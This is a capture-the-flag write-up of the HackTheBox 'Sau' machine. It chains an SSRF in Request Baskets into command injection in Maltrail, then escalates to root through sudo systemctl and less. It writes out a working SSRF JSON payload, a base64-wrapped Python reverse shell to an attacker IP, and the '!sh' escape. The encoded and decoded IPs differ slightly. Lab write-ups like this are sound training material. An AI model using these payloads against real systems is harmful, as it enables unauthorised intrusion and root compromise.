---
layout: page
title: Sau
img: assets/img/writeups/hackthebox/Sau/sau_logo.png
importance: 1
category: hackthebox
---

## Foothold
Port scanning - 22, 80 (filtred?), 55555
{% include figure.html path="assets/img/writeups/hackthebox/Sau/sau_nmap.png" title="example image" class="img-fluid rounded z-depth-1" %}

Let's take a look at unknown service. We will meet the Request Basket - web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.

{% include figure.html path="assets/img/writeups/hackthebox/Sau/sau_web.png" title="example image" class="img-fluid rounded z-depth-1" %}

Directory and subdomain bruteforcing give nothing. Since we have an open source application - a good practice to discover [github](https://github.com/darklynx/request-baskets) project.

Remember version (v 1.2.1) and some googling helps to identify SSRF CVE-2023-27163.

## User
CVE-2023-27163 vulnerability allows attackers to access network resources and sensitive information by exploiting the /api/baskets/{name} component through a crafted API request.

Time to recall a filtered port at 80 port and all solution be obvious. Exploiting SSRF from service on 55555 port can give access to 80 filtered port.

To exploit that SSRF, set proxy settings in web application to forward traffic to 0.0.0.0:80. POST request with JSON body we looks like that:
```json
{
	"forward_url": "http://0.0.0.0:80", 
	"proxy_response": true, 
	"insecure_tls": false, 
	"expand_path": false, 
	"capacity": 10
}
```

After updating proxy settings web server forward traffic to filtered port. It gives an opportunity to discover information about new service. 

Service on filtered port- [Maltrail](https://github.com/stamparm/maltrail) v0.53. 
  
The Internet whispers that the application with this version is subject to unauthenticated OS command injection.

The `subprocess.check_output` function in mailtrail/core/http.py contains a command injection vulnerability in the `params.get("username")`parameter.

An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.

My exploit request with reverse shell looked like:

```
username=;`echo+ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNC4xMzQiO2V4cG9ydCBSUE9SVD05MDAwO3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw|base64+-d|bash`
```

Where Base64 code is default python reverse shell:
```bash
export RHOST="10.10.14.183";
export RPORT=9000;
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

Handling shell with netcat will give us an user access to machine.

Here we got an user flag!
{% include figure.html path="assets/img/writeups/hackthebox/Sau/sau_user.png" title="example image" class="img-fluid rounded z-depth-1" %}

## Root
```bash
sudo -l
```
Puma user can use systemctl with sudo privileges.
{% include figure.html path="assets/img/writeups/hackthebox/Sau/sau_privesc2.png" title="example image" class="img-fluid rounded z-depth-1" %}

Output of that sudo command gets piped automatically through 'less'. It can give opportunity to execute commands in 'less' command line.
```less
!sh
```
It means, user have ability to spawn root shell and get second flag.

{% include figure.html path="assets/img/writeups/hackthebox/Sau/sau_privesc.png" title="example image" class="img-fluid rounded z-depth-1" %}
